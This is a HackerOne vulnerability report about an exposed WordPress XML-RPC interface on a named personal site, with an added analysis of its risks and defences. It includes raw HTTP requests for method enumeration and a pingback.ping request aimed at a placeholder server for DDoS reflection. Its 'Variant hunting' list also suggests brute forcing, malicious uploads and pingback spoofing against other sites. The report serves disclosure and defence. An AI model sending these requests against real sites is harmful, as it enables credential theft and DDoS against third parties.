# XML-RPC Interface Enabled on WordPress Site - Brute Force and DDoS Vector

## Metadata
- **Source:** HackerOne
- **Report:** 769716 | https://hackerone.com/reports/769716
- **Submitted:** 2020-01-07
- **Reporter:** shrimant_yogi
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Insecure Configuration, Information Disclosure, Brute Force Vulnerability, DDoS Attack Vector
- **CVEs:** None
- **Category:** memory-binary

## Summary
The target WordPress site has XML-RPC (xmlrpc.php) interface enabled, exposing a full list of available RPC methods including authentication endpoints. This misconfiguration enables attackers to conduct brute force attacks against user credentials and leverage the site as a DDoS amplification vector through pingback/trackback functionality.

## Attack scenario
1. Attacker discovers xmlrpc.php is accessible by sending a system.listMethods request and receiving a complete method enumeration
2. Attacker identifies authentication-related methods (wp.getAuthors, metaWeblog methods) that can be abused for credential brute forcing
3. Attacker uses multicall or batch requests to speed up brute force attacks against WordPress user accounts
4. Attacker leverages pingback.ping functionality to amplify DDoS attacks by spoofing source IPs and using the site as a reflector
5. Site becomes part of a botnet infrastructure used for large-scale DDoS campaigns against third-party victims
6. Successful credential compromise could lead to post creation, malware injection, or site defacement

## Root cause
WordPress administrator failed to disable XML-RPC interface despite it being a well-known attack vector. Modern WordPress versions recommend disabling xmlrpc.php when not actively needed for third-party integrations, as it increases attack surface without providing essential functionality for most sites.

## Attacker mindset
Reconnaissance-focused attacker scanning WordPress installations for misconfigurations. XML-RPC enumeration is part of standard WordPress attack reconnaissance. Attacker seeks to either compromise accounts for site takeover or weaponize the site for DDoS amplification in larger attack campaigns.

## Defensive takeaways
- Disable XML-RPC interface entirely if not required for legitimate third-party integrations (add to wp-config.php or .htaccess)
- If XML-RPC is needed, implement strict rate limiting on xmlrpc.php requests to prevent brute force attacks
- Restrict XML-RPC access by IP whitelist to known, trusted API consumers only
- Disable pingback and trackback functionality to eliminate DDoS amplification vectors
- Monitor xmlrpc.php access logs for suspicious patterns (rapid authentication attempts, system.listMethods calls)
- Use Web Application Firewall (WAF) rules to block malicious XML-RPC patterns and method calls
- Keep WordPress and all plugins updated to patch XML-RPC related vulnerabilities
- Implement strong authentication mechanisms (2FA) to mitigate credential brute force impacts

## Variant hunting
Scan for other XML-RPC enabled WordPress sites and perform multicall batch attacks for faster brute forcing
Test for other remote code execution methods via metaWeblog.newMediaObject or wp.uploadFile with malicious payloads
Enumerate custom XML-RPC methods added by plugins (demo.addTwoNumbers in this case suggests custom implementations)
Attempt pingback spoofing to trigger reflected DDoS traffic amplification
Search for vulnerable plugins that expose additional RPC methods beyond standard WordPress functionality
Test for information disclosure via system.getCapabilities and system.getMethodSignature calls

## MITRE ATT&CK
- T1190
- T1046
- T1110
- T1498
- T1592
- T1589

## Notes
This is a well-documented, low-complexity finding affecting a personal blog. While severity is medium, the impact could be significant if the site were compromised or weaponized. The researcher provided clear proof-of-concept with actual response data showing full method enumeration. XML-RPC brute force attacks are commonly orchestrated through botnets using tools like Wpscan or custom scripts that exploit multicall batching for efficiency. The finding highlights why security defaults matter - simply disabling unnecessary features prevents entire classes of attacks.

## Full report
<details><summary>Expand</summary>

Hi Team,

The website https://www.iandunn.name has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts. Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS.

URL: https://www.iandunn.name

In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.

Request:
POST /xmlrpc.php HTTP/1.1
Host: www.iandunn.name
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 135
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

-------------------------------------------------------------------------------------------------------------------------------------

Response:

HTTP/1.1 200 OK
Date: Tue, 07 Jan 2020 19:32:48 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Set-Cookie: __cfduid=dc58db4ecd3ff4946ffca93e21566ff371578425567; expires=Thu, 06-Feb-20 19:32:47 GMT; path=/; domain=.iandunn.name; HttpOnly; SameSite=Lax
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000
CF-Cache-Status: DYNAMIC
X-Content-Type-Options: nosniff
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 55185c145806dcd6-SIN
Content-Length: 4272
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

Notice that a successful response is received showing that the xmlrpc.php file is enabled. Now, considering the domain https://www.iandunn.name, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.

POST /xmlrpc.php HTTP/1.1
Host: https://www.iandunn.name
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 135
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://<YOUR SERVER ></string></value>
</param>
<param>
<value><string>https://www.iandunn.name</string></value>
</param>
</params>

Remediation:
If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.

POC: Screenshots are attached

Reference :
1) Here is the explanation of xmlrpc file enable brute force attack- https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
2) The explanation for xmlrpc.php file will enable dos attack- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html

Reference Hackerone Reports: #325040 #448524 #448524

Thanks, waiting for your response.

## Impact

1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.

2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials

</details>

---
*Analysed by Claude on 2026-05-24*
